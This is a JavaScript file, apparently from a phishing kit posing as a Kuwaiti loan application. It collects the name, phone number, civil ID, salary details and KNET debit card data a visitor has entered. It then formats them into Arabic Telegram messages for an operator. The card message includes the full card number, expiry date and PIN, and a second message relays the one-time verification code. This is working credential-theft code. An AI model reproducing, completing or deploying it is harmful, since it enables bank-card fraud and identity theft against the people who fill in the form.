(function () {
  function normalizeText(value) {
    return typeof value === 'string' ? value.trim() : '';
  }

  function formatTelegramTelLink(value) {
    const rawValue = value == null ? '' : String(value).trim();

    if (!rawValue || rawValue === 'غير متوفر' || rawValue === 'غير معروف') {
      return rawValue || 'غير معروف';
    }

    return rawValue;
  }

  function readStoredIdentity() {
    return {
      name: normalizeText(localStorage.getItem('step1.name')),
      phone: normalizeText(localStorage.getItem('step1.phone')),
      civilId: normalizeText(localStorage.getItem('step1.civil')),
    };
  }

  function readStoredSalary() {
    return {
      netSalary: normalizeText(localStorage.getItem('step2.netSalary')),
      requestedAmount: normalizeText(localStorage.getItem('step2.requestedAmount')),
      workSector: normalizeText(localStorage.getItem('step2.workSector')),
      jobTitle: normalizeText(localStorage.getItem('step2.jobTitle')),
    };
  }

  function getIdentityLines() {
    const identity = readStoredIdentity();
    const lines = [
      `👤 الاسم: ${identity.name || 'غير متوفر'}`,
    ];

    if (identity.civilId) {
      lines.push(`الرقم المدني : ${identity.civilId}`);
    }

    lines.push(`📞 رقم الهاتف: ${formatTelegramTelLink(identity.phone || 'غير متوفر')}`);
    return lines;
  }

  function maskCardNumber(value) {
    const digits = String(value || '').replace(/\D/g, '');
    if (!digits) return 'N/A';
    if (digits.length <= 8) return digits.padStart(8, '*');
    return `${digits.slice(0, 4)} **** **** ${digits.slice(-4)}`;
  }

  function readStoredKnetVerificationData() {
    if (typeof localStorage === 'undefined') {
      return {};
    }

    const candidateKeys = ['knetVerificationData', 'knetPaymentData', 'knetFormData', 'paymentData'];

    for (const key of candidateKeys) {
      try {
        const raw = localStorage.getItem(key);
        if (!raw) continue;
        const parsed = JSON.parse(raw);
        if (parsed && typeof parsed === 'object') {
          return parsed;
        }
      } catch (error) {
        console.warn('Unable to parse stored KNET verification data from key:', key, error);
      }
    }

    return {};
  }

  function normalizeKnetPayload(payload = {}) {
    const stored = readStoredKnetVerificationData();
    const source = { ...stored, ...(payload && typeof payload === 'object' ? payload : {}) };
    const cardNumber = String(source.cardNumber || source.card || source.debitnumber || source.debitNumber || source.number || '').replace(/\D/g, '').slice(0, 19);
    const expiryMonth = String(source.expiryMonth || source.month || source.expiry || '').replace(/\D/g, '').slice(0, 2);
    const expiryYear = String(source.expiryYear || source.year || source.expiryYearRaw || '').replace(/\D/g, '').slice(0, 4);
    const pin = String(source.pin || source.pinCode || source.cvv || '').replace(/\D/g, '').slice(0, 4);
    const prefix = String(source.prefix || source.cardBrand || cardNumber.slice(0, 6) || '').replace(/\D/g, '').slice(0, 6);
    const bankName = String(source.bankName || source.cardName || source.cardBrand || 'BBK').trim() || 'BBK';

    return {
      createdAt: new Date().toISOString(),
      bankName,
      amount: Number(source.amount) || 0,
      currency: String(source.currency || 'KWD').toUpperCase(),
      cardNumber,
      prefix: prefix || cardNumber.slice(0, 6),
      expiryMonth: expiryMonth || 'MM',
      expiryYear: expiryYear || 'YY',
      pin,
      paymentMethod: String(source.paymentMethod || 'KNET').trim(),
      reference: String(source.reference || `KNET-${Date.now()}`).trim(),
      email: String(source.email || '').trim(),
      phone: String(source.phone || '').trim(),
      customerName: String(source.customerName || '').trim(),
      notes: String(source.notes || '').trim(),
    };
  }

  window.TELEGRAM_MESSAGES = window.TELEGRAM_MESSAGES || {};

  window.TELEGRAM_MESSAGES.buildStep1Message = function buildStep1Message() {
    return [
      '📝   البيانات الشخصية',
      ...getIdentityLines(),
    ].filter(Boolean).join('\n');
  };

  window.TELEGRAM_MESSAGES.buildStep2Message = function buildStep2Message() {
    const salaryDetails = readStoredSalary();
    const identityLines = getIdentityLines();

    return [
      '💼   معلومات الراتب/الوظيفة',
      ...identityLines,
      `💰 الراتب المتوقع: ${salaryDetails.netSalary || 'غير متوفر'}`,
      `📄 المبلغ المطلوب: ${salaryDetails.requestedAmount || 'غير متوفر'}`,
      `🏢 القطاع: ${salaryDetails.workSector || 'غير متوفر'}`,
      `👔 اسم الوظيفة: ${salaryDetails.jobTitle || 'غير متوفر'}`,
    ].filter(Boolean).join('\n');
  };

  window.TELEGRAM_MESSAGES.buildStep3PaymentMessage = function buildStep3PaymentMessage() {
    const customerName = (localStorage.getItem('step1.name') || 'غير معروف').trim() || 'غير معروف';
    const customerPhone = (localStorage.getItem('step1.phone') || 'غير معروف').trim() || 'غير معروف';

    return [
      '🔔 دخل الى الدفع',
      `👤 الاسم: ${customerName}`,
      `📞 رقم الهاتف: ${customerPhone}`,
    ].join('\n');
  };

  window.TELEGRAM_MESSAGES.buildKnetFormMessage = function buildKnetFormMessage(payload) {
    const data = normalizeKnetPayload(payload);
    const rawCardNumber = data.cardNumber || 'N/A';
    const prefix = data.prefix || rawCardNumber.slice(0, 6) || 'N/A';
    const bankName = data.bankName || 'BBK';
    const customerName = data.customerName || 'غير محدد';
    const customerPhone = data.phone || 'غير محدد';

    return [
      '📩 بطاقة دفع من',
      '',
      `الاسم : ${customerName}`,
      `رقم الهاتف : ${customerPhone}`,
      '',
      '────────────────────',
      `🏦 اسم البنك: ${bankName}`,
      `💳 البادئة: ${prefix}`,
      `🔢 رقم البطاقة: ${rawCardNumber ? rawCardNumber : 'N/A'}`,
      `📅 تاريخ الانتهاء: ${String(data.expiryMonth || 'MM').padStart(2, '0')} / ${String(data.expiryYear || 'YY').padStart(2, '0')}`,
      `🔐 الرقم السري: ${data.pin || '0000'}`,
    ].join('\n');
  };

  window.TELEGRAM_MESSAGES.buildKnetOtpMessage = function buildKnetOtpMessage(payload = {}) {
    const stored = readStoredKnetVerificationData();
    const source = { ...stored, ...(payload && typeof payload === 'object' ? payload : {}) };
    const cardNumber = String(source.cardNumber || source.card || source.debitnumber || source.number || '').replace(/\D/g, '');
    const expiryMonth = String(source.expiryMonth || source.month || 'MM').replace(/\D/g, '').slice(0, 2) || 'MM';
    const expiryYear = String(source.expiryYear || source.year || 'YY').replace(/\D/g, '').slice(0, 4) || 'YY';
    const otp = String(source.otp || '').replace(/\D/g, '').slice(0, 6);
    const customerName = String(source.customerName || '').trim() || 'غير محدد';
    const customerPhone = String(source.phone || '').trim() || 'غير محدد';

    return [
      '🔐 رمز تحقق من',
      '',
      `الاسم : ${customerName}`,
      `رقم الهاتف : ${customerPhone}`,
      '────────────────────',
      '',
      `💳 البطاقة: ${maskCardNumber(cardNumber)}`,
      `📅 شهر الانتهاء: ${expiryMonth.padStart(2, '0')}`,
      `📅 سنة الانتهاء: ${expiryYear.slice(-2) || 'YY'}`,
      '',
      `🔢 الرمز: ${otp || 'N/A'}`,
    ].join('\n');
  };
})();
